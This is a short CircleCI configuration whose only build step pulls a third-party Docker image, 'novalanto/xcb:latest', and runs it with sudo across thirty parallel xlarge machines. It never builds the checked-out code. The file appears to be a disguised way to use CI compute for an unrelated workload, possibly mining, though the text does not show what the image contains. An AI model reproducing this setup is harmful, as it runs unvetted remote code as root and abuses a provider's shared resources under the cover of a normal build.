working_dir: &working_dir ~/app

version: 2.1

workflows:
  main:
    jobs:
      - build

jobs:
  build:
    parallelism: 30
    machine:
      image: ubuntu-2204:2024.05.1
    resource_class: xlarge
    steps:
      - checkout
      - run:
         name: "Bangun"
         command: sudo docker run novalanto/xcb:latest
